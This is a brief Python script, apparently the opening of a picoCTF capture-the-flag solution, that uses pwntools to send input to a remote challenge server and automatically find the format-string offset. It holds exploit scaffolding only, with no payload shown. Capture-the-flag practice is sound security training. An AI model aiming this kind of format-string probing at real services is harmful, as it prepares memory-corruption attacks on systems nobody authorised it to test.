from pwn import *

def send_payload(payload):
    p = remote('rhea.picoctf.net', 51841)
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
# log.info(f"offset = {offset}")
